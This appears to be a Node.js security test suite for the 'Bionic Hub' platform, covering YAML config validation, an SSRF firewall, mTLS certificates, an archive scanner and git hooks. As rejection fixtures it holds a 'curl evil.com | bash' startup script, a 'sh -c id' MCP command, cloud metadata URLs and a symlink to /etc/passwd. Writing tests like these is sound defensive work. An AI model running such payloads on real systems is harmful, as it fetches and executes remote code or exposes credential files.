import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { execFileSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import * as tar from 'tar';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const repoRoot = path.resolve(__dirname, '../..');

import {
  createId,
  isValidDnsLabel,
  isValidPrefixedId,
  parseConfigYaml,
  parseBionicModuleYaml,
  canTransitionProject,
  buildWakeIdempotencyKey
} from '../../packages/shared/dist/index.js';
import { HubCertificateAuthority } from '../dist/server/auth/ca.js';
import { assertIpAllowed, assertSafeOutboundUrl } from '../dist/server/gateways/ssrf.js';
import { parseSubdomainHost } from '../dist/server/proxy/editorProxy.js';
import { loadHubConfig } from '../dist/server/config.js';
import { PublishService } from '../dist/server/publish/service.js';
import { LocalBareGitProvider } from '../dist/server/gateways/git/proxy.js';
import { detectResumeJump } from '../dist/daemon/index.js';
import { hashPassword, verifyPassword, LocalAuthService } from '../dist/server/auth/localAuth.js';

test('Bionic Hub Core Architecture & Security Suite', async (t) => {
  await t.test('RFC 1123 DNS-safe simplified IDs, legacy ULID compatibility, and State Machine transitions (C6)', () => {
    const prjId = createId('prj');
    const pubId = createId('pub');
    const runId = createId('run');
    const usrId = createId('usr');
    assert.ok(/^prj-[0-9a-hjkmnp-tv-z]{8}$/.test(prjId), `expected short prj id, got ${prjId}`);
    assert.ok(/^pub-[0-9a-hjkmnp-tv-z]{8}$/.test(pubId), `expected short pub id, got ${pubId}`);
    assert.ok(/^run-[0-9a-hjkmnp-tv-z]{8}$/.test(runId), `expected short run id, got ${runId}`);
    assert.ok(/^usr-[0-9a-hjkmnp-tv-z]{26}$/.test(usrId), `expected full ULID usr id, got ${usrId}`);
    assert.ok(isValidPrefixedId(prjId, 'prj'));
    assert.ok(isValidPrefixedId(pubId, 'pub'));
    assert.ok(isValidPrefixedId(runId, 'run'));
    // Legacy 26-char ULID project IDs remain valid for existing deployments
    assert.ok(isValidPrefixedId('prj-01jdx9k3m4a7b8c9d0e1f2g3h4', 'prj'));
    assert.ok(isValidDnsLabel(prjId));
    assert.equal(prjId.includes('_'), false);
    assert.equal(isValidPrefixedId('prj_invalid_underscore', 'prj'), false);

    assert.equal(canTransitionProject('running', 'freezing'), true);
    assert.equal(canTransitionProject('frozen', 'resuming'), true);
    assert.equal(canTransitionProject('deleted', 'running'), false);
    assert.equal(buildWakeIdempotencyKey(prjId, 4), `wake:${prjId}:v4`);
  });

  await t.test('Admin GitOps YAML schemas validate all infra/config-examples and block security violations (H2)', () => {
    const examplesRoot = path.join(repoRoot, 'infra/config-examples');
    const tmpl = parseConfigYaml('template', fs.readFileSync(path.join(examplesRoot, 'templates/bio-standard.yaml'), 'utf-8'));
    assert.equal(tmpl.metadata.slug, 'bio-standard');

    const gemini = parseConfigYaml('model', fs.readFileSync(path.join(examplesRoot, 'models/gemini-2-5-flash.yaml'), 'utf-8'));
    assert.equal(gemini.spec.provider, 'gemini');

    const bedrock = parseConfigYaml('model', fs.readFileSync(path.join(examplesRoot, 'models/claude-sonnet-bedrock.yaml'), 'utf-8'));
    assert.equal(bedrock.spec.provider, 'aws_bedrock');
    assert.equal(bedrock.spec.protocol, 'anthropic');

    const skill = parseConfigYaml('skill', fs.readFileSync(path.join(examplesRoot, 'skills/differential-expression-qc/skill.yaml'), 'utf-8'));
    assert.equal(skill.metadata.slug, 'differential-expression-qc');

    const mcp = parseConfigYaml('mcp', fs.readFileSync(path.join(examplesRoot, 'mcp/pubmed-search.yaml'), 'utf-8'));
    assert.equal(mcp.spec.routing, 'hub_gateway');

    // Security H2: Hard-reject `stdio` MCP on `hub_gateway`
    assert.throws(
      () =>
        parseConfigYaml(
          'mcp',
          `apiVersion: bionic.io/v1
kind: McpServerConfig
metadata:
  slug: evil-stdio
  displayName: Evil
spec:
  transport: stdio
  routing: hub_gateway
  command: ["sh", "-c", "id"]
`
        ),
      /strictly forbidden/
    );

    // Security H2: Hard-reject raw `startupScript` field in ComputeTemplate YAML
    assert.throws(() =>
      parseConfigYaml(
        'template',
        `apiVersion: bionic.io/v1
kind: ComputeTemplate
metadata:
  slug: bad-tmpl
  displayName: Bad
compute:
  image: "projects/p/global/images/i"
iam:
  serviceAccountEmail: "sa@p.iam.gserviceaccount.com"
startupScript: "curl evil.com | bash"
`
      )
    );

    // Validate example project bionic.yaml + landing-page title/summary support
    const mod = parseBionicModuleYaml(fs.readFileSync(path.join(repoRoot, 'examples/demo-rnaseq-project/bionic.yaml'), 'utf-8'));
    assert.deepEqual(mod.entrypoint.argv, ['bash', 'scripts/run.sh']);
    const modWithSummary = parseBionicModuleYaml(`schemaVersion: 1
name: kidney-rnaseq
title: "Kidney Cohort RNA-seq"
summary: "Differential expression across 48 renal biopsies."
`);
    assert.equal(modWithSummary.title, 'Kidney Cohort RNA-seq');
    assert.equal(modWithSummary.summary, 'Differential expression across 48 renal biopsies.');
  });

  await t.test('SSRF Firewall blocks IMDS, loopback, IPv4-mapped IPv6, internal CIDRs, and HTTP (H1)', async () => {
    assert.throws(() => assertIpAllowed('169.254.169.254'), /forbidden range/);
    assert.throws(() => assertIpAllowed('127.0.0.1'), /forbidden range/);
    assert.throws(() => assertIpAllowed('::1'), /forbidden/);
    assert.throws(() => assertIpAllowed('[::1]'), /forbidden/);
    assert.throws(() => assertIpAllowed('::ffff:169.254.169.254'), /forbidden/);
    assert.throws(() => assertIpAllowed('::ffff:a9fe:a9fe'), /forbidden/);
    assert.throws(() => assertIpAllowed('fe90::1'), /forbidden/);
    assert.throws(() => assertIpAllowed('10.42.16.5'), /RFC1918/);

    // Non-devMode refuses to boot with missing HUB_DOMAIN (#14)
    assert.throws(() => loadHubConfig({ NODE_ENV: 'production' }), /HUB_DOMAIN must be set/);

    // Explicit allowlist works while blockedCidrs still wins
    assert.doesNotThrow(() =>
      assertIpAllowed('10.10.0.5', { allowedPrivateCidrs: ['10.10.0.0/16'], blockedCidrs: ['10.42.16.0/20'] })
    );
    assert.throws(
      () => assertIpAllowed('10.42.16.5', { allowedPrivateCidrs: ['10.0.0.0/8'], blockedCidrs: ['10.42.16.0/20'] }),
      /blocked internal subnet/
    );

    await assert.rejects(
      () => assertSafeOutboundUrl('http://metadata.google.internal/computeMetadata/v1/', { allowHttp: true }),
      /forbidden hostname/
    );
    await assert.rejects(
      () => assertSafeOutboundUrl('http://example.com/mcp', { allowHttp: false }),
      /HTTPS required/
    );
  });

  await t.test('Internal mTLS CA signs 72h VM certs with SPIFFE SAN & Ed25519 Workload JWTs (C1/C2)', async () => {
    const ca = await HubCertificateAuthority.create({ issuer: 'https://hub.bionic.example.com' });
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'bionic-ca-test-'));
    try {
      const keyPath = path.join(tmpDir, 'vm.key');
      const csrPath = path.join(tmpDir, 'vm.csr');
      execFileSync('openssl', ['ecparam', '-name', 'prime256v1', '-genkey', '-noout', '-out', keyPath]);
      execFileSync('openssl', ['req', '-new', '-key', keyPath, '-subj', '/CN=123456789', '-out', csrPath]);
      const csrPem = fs.readFileSync(csrPath, 'utf-8');

      const prjId = createId('prj');
      const issued = await ca.signVmCsr({ csrPem, projectId: prjId, instanceId: '123456789', ttlHours: 72 });
      assert.ok(issued.certPem.includes('BEGIN CERTIFICATE'));

      const certTxt = execFileSync('openssl', ['x509', '-noout', '-text'], { input: issued.certPem, encoding: 'utf-8' });
      assert.ok(certTxt.includes(`URI:spiffe://bionic/project/${prjId}`));

      const jwt = await ca.mintWorkloadJwt({ projectId: prjId, vmInstanceId: '123456789', kind: 'editor' }, 900);
      const claims = await ca.verifyWorkloadJwt(jwt);
      assert.equal(claims.projectId, prjId);
      assert.equal(claims.vmInstanceId, '123456789');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  await t.test('Subdomain routing isolates Editor, Live Report, and Publication origins & rejects underscores', () => {
    const cfg = loadHubConfig({ HUB_DOMAIN: 'bionic.example.com', HUB_DEV_MODE: 'false' });
    const prjId = createId('prj');
    const pubId = createId('pub');

    const ed = parseSubdomainHost(`${prjId}.editors.bionic.example.com`, cfg);
    assert.deepEqual(ed, {
      scope: 'editor',
      resourceId: prjId,
      origin: `https://${prjId}.editors.bionic.example.com`
    });

    const liveRep = parseSubdomainHost(`${prjId}.reports.bionic.example.com`, cfg);
    assert.equal(liveRep?.scope, 'live_report');

    const pubRep = parseSubdomainHost(`${pubId}.reports.bionic.example.com`, cfg);
    assert.equal(pubRep?.scope, 'publication');

    assert.equal(parseSubdomainHost('prj_underscore.editors.bionic.example.com', cfg), null);
    assert.equal(parseSubdomainHost('hub.bionic.example.com', cfg), null);
  });

  await t.test('Server-side Publish Intake scanner rejects symlinks, raw bio files, and hash-matched leaks', async () => {
    const cfg = loadHubConfig({ HUB_DEV_MODE: 'true', HUB_LOCAL_STORAGE_DIR: fs.mkdtempSync(path.join(os.tmpdir(), 'bionic-pub-svc-')) });
    const svc = new PublishService(null, cfg, null, null);
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'bionic-tar-test-'));

    try {
      // 1. Clean report passes
      const cleanDir = path.join(tmpDir, 'clean');
      fs.mkdirSync(cleanDir);
      fs.writeFileSync(path.join(cleanDir, 'index.html'), '<h1>Clean Report</h1>');
      const cleanTar = path.join(tmpDir, 'clean.tar.gz');
      await tar.create({ gzip: true, file: cleanTar, cwd: cleanDir }, ['index.html']);
      const cleanRes = await svc.inspectReportArchive(fs.readFileSync(cleanTar), new Set());
      assert.equal(cleanRes.fileCount, 1);
      fs.rmSync(path.dirname(cleanRes.extractDir), { recursive: true, force: true });

      // 2. Tarball containing a .fastq.gz raw bioinformatics file is rejected
      const badBioDir = path.join(tmpDir, 'bad-bio');
      fs.mkdirSync(badBioDir);
      fs.writeFileSync(path.join(badBioDir, 'index.html'), '<h1>Leak</h1>');
      fs.writeFileSync(path.join(badBioDir, 'sample.fastq.gz'), 'fake-fastq-data');
      const badBioTar = path.join(tmpDir, 'bad-bio.tar.gz');
      await tar.create({ gzip: true, file: badBioTar, cwd: badBioDir }, ['index.html', 'sample.fastq.gz']);
      await assert.rejects(() => svc.inspectReportArchive(fs.readFileSync(badBioTar), new Set()), /Raw bioinformatics file/);

      // 3. Tarball containing a symlink is rejected
      const badSymDir = path.join(tmpDir, 'bad-sym');
      fs.mkdirSync(badSymDir);
      fs.writeFileSync(path.join(badSymDir, 'index.html'), '<h1>Symlink</h1>');
      fs.symlinkSync('/etc/passwd', path.join(badSymDir, 'passwd.txt'));
      const badSymTar = path.join(tmpDir, 'bad-sym.tar.gz');
      await tar.create({ gzip: true, file: badSymTar, cwd: badSymDir }, ['index.html', 'passwd.txt']);
      await assert.rejects(() => svc.inspectReportArchive(fs.readFileSync(badSymTar), new Set()), /Symlink/);
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
      fs.rmSync(cfg.localStorageDir, { recursive: true, force: true });
    }
  });

  await t.test('Git pre-receive hook rejects pushing data/raw/* files while allowing code commits', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'bionic-git-test-'));
    try {
      const provider = new LocalBareGitProvider(path.join(tmpDir, 'repos'));
      const prjId = createId('prj');
      const repoUrl = await provider.ensureProjectRepo(prjId);

      const workDir = path.join(tmpDir, 'work');
      execFileSync('git', ['clone', repoUrl, workDir], { stdio: 'pipe' });
      execFileSync('git', ['config', 'user.email', 'test@bionic.local'], { cwd: workDir });
      execFileSync('git', ['config', 'user.name', 'Bionic Test'], { cwd: workDir });

      // Valid commit pushes cleanly
      fs.writeFileSync(path.join(workDir, 'SPEC.md'), '# Plan\n');
      execFileSync('git', ['add', 'SPEC.md'], { cwd: workDir });
      execFileSync('git', ['commit', '-m', 'init'], { cwd: workDir });
      execFileSync('git', ['push', 'origin', 'HEAD'], { cwd: workDir, stdio: 'pipe' });

      const headSha = execFileSync('git', ['rev-parse', 'HEAD'], { cwd: workDir, encoding: 'utf-8' }).trim();
      assert.equal(await provider.verifyCommitExists(prjId, headSha), true);

      // Attempting to push data/raw/secret.csv is rejected by server pre-receive hook!
      fs.mkdirSync(path.join(workDir, 'data', 'raw'), { recursive: true });
      fs.writeFileSync(path.join(workDir, 'data', 'raw', 'secret.csv'), 'a,b\n1,2\n');
      execFileSync('git', ['add', '-f', 'data/raw/secret.csv'], { cwd: workDir });
      execFileSync('git', ['commit', '-m', 'accidental raw commit'], { cwd: workDir });
      assert.throws(() => execFileSync('git', ['push', 'origin', 'HEAD'], { cwd: workDir, stdio: 'pipe' }));
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  await t.test('bionic-daemon suspend/resume jump detector flags multi-day wake cleanly (C1)', () => {
    assert.equal(detectResumeJump(1000, 1200, 5000), false);
    assert.equal(detectResumeJump(1000, 1000 + 72 * 3600 * 1000, 5000), true);
  });

  await t.test('bionic-daemon mTLS editor proxy forwards GET and POST cleanly on Node 22 (no premature req close abort)', async () => {
    const http = await import('node:http');
    const https = await import('node:https');
    const { BionicVmDaemon } = await import('../dist/daemon/index.js');

    const ca = await HubCertificateAuthority.create({ issuer: 'https://hub.bionic.example.com' });
    const prjId = createId('prj');
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'bionic-daemon-e2e-'));

    // Fake local bioniceditor server with a slight delay so req.close fires before response
    const mockEditor = http.createServer((req, res) => {
      const chunks = [];
      req.on('data', (c) => chunks.push(c));
      req.on('end', () => {
        setTimeout(() => {
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ method: req.method, url: req.url, body: Buffer.concat(chunks).toString('utf-8') }));
        }, 30);
      });
    });

    // Fake Hub attestation endpoint
    const mockHub = http.createServer((req, res) => {
      const chunks = [];
      req.on('data', (c) => chunks.push(c));
      req.on('end', async () => {
        const body = JSON.parse(Buffer.concat(chunks).toString('utf-8'));
        const issued = await ca.signVmCsr({ csrPem: body.csrPem, projectId: prjId, instanceId: '123', ttlHours: 72 });
        const workloadJwt = await ca.mintWorkloadJwt({ projectId: prjId, vmInstanceId: '123', kind: 'editor' }, 900);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ certPem: issued.certPem, caCertPem: issued.caCertPem, workloadJwt }));
      });
    });

    await new Promise((r) => mockEditor.listen(0, '127.0.0.1', r));
    await new Promise((r) => mockHub.listen(0, '127.0.0.1', r));
    const editorPort = mockEditor.address().port;
    const hubPort = mockHub.address().port;

    // Pick free ephemeral ports for daemon
    const getFreePort = async () => {
      const s = http.createServer();
      await new Promise((r) => s.listen(0, '127.0.0.1', r));
      const p = s.address().port;
      await new Promise((r) => s.close(r));
      return p;
    };
    const mtlsEditorPort = await getFreePort();
    const mtlsInternalPort = await getFreePort();
    const shimPort = await getFreePort();

    const daemon = new BionicVmDaemon({
      hubOrigin: `http://127.0.0.1:${hubPort}`,
      projectId: prjId,
      workspaceDir: tmpDir,
      editorSocketPath: path.join(tmpDir, 'nonexistent.sock'),
      editorLoopbackPort: editorPort,
      mtlsEditorPort,
      mtlsInternalPort,
      shimPort,
      shimToken: 'test-shim',
      daemonToken: 'test-daemon',
      runtimeDir: path.join(tmpDir, 'run'),
      workspaceUser: 'nobody'
    });

    try {
      await daemon.start();
      const creds = ca.getHubClientCredentials();
      const doReq = (method, reqPath, payload) =>
        new Promise((resolve, reject) => {
          const r = https.request(
            {
              host: '127.0.0.1',
              port: mtlsEditorPort,
              path: reqPath,
              method,
              headers: {
                'x-bionic-origin-scope': 'editor',
                'x-bionic-user-id': 'usr-test',
                ...(payload ? { 'content-type': 'application/json' } : {})
              },
              key: creds.keyPem,
              cert: creds.certPem,
              ca: creds.caCertPem,
              rejectUnauthorized: true,
              checkServerIdentity: () => undefined
            },
            (res) => {
              let data = '';
              res.on('data', (c) => (data += c));
              res.on('end', () => resolve({ status: res.statusCode, data }));
            }
          );
          r.on('error', reject);
          if (payload) r.write(payload);
          r.end();
        });

      const getRes = await doReq('GET', '/');
      assert.equal(getRes.status, 200);
      assert.equal(JSON.parse(getRes.data).method, 'GET');

      const postRes = await doReq('POST', '/api/test', JSON.stringify({ hello: 'world' }));
      assert.equal(postRes.status, 200);
      assert.equal(JSON.parse(postRes.data).body, JSON.stringify({ hello: 'world' }));
    } finally {
      daemon.stop();
      mockEditor.close();
      mockHub.close();
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  await t.test('Demo local email/password scrypt hashing, rate limiting, and authenticated publication site routing', async () => {
    await assert.rejects(() => hashPassword('short'), /at least 12 characters/);

    const hashed = await hashPassword('Correct-Horse-Battery-42!');
    assert.ok(hashed.startsWith('scrypt$'));
    assert.equal(await verifyPassword('Correct-Horse-Battery-42!', hashed), true);
    assert.equal(await verifyPassword('Wrong-Password-123456!', hashed), false);

    // Rate limiting locks out after 10 failures
    const localAuth = new LocalAuthService(null, loadHubConfig({ HUB_DEV_MODE: 'true' }));
    for (let i = 0; i < 10; i++) {
      localAuth.recordFailure('email:victim@example.com');
    }
    assert.throws(() => localAuth.checkRateLimit('email:victim@example.com'), /Too many failed/);
    localAuth.clearFailures('email:victim@example.com');
    assert.doesNotThrow(() => localAuth.checkRateLimit('email:victim@example.com'));

    // Authenticated demo publication site routing (`HUB_PUBLIC_REPORTS_REQUIRE_AUTH=true`)
    const demoCfg = loadHubConfig({
      HUB_DOMAIN: 'bionic.example.com',
      HUB_DEV_MODE: 'false',
      HUB_PUBLIC_REPORTS_REQUIRE_AUTH: 'true'
    });
    const pubSite = parseSubdomainHost('public-reports.bionic.example.com', demoCfg);
    assert.deepEqual(pubSite, {
      scope: 'public_reports_site',
      resourceId: 'site',
      origin: 'https://public-reports.bionic.example.com'
    });

    // Enterprise mode (client secures static site) does NOT hijack public-reports host into Hub auth proxy
    const entCfg = loadHubConfig({
      HUB_DOMAIN: 'bionic.example.com',
      HUB_DEV_MODE: 'false',
      HUB_PUBLIC_REPORTS_REQUIRE_AUTH: 'false'
    });
    assert.equal(parseSubdomainHost('public-reports.bionic.example.com', entCfg), null);
  });

  await t.test('Packer VM provisioner and VM self-test suite pass bash syntax checks and wire image-build gate', () => {
    const provPath = path.join(repoRoot, 'infra/packer/scripts/provision.sh');
    const verifyPath = path.join(repoRoot, 'infra/packer/scripts/verify-vm.sh');
    execFileSync('bash', ['-n', provPath]);
    execFileSync('bash', ['-n', verifyPath]);
    const provText = fs.readFileSync(provPath, 'utf-8');
    assert.ok(provText.includes('https://opencode.ai/v2/install'));
    assert.ok(provText.includes('/usr/local/bin/opencode'));
    assert.ok(provText.includes('bionic-vm-selftest --image-build'));
    assert.ok(provText.includes('BASE_SPEC=PLAN.md'));
  });
});
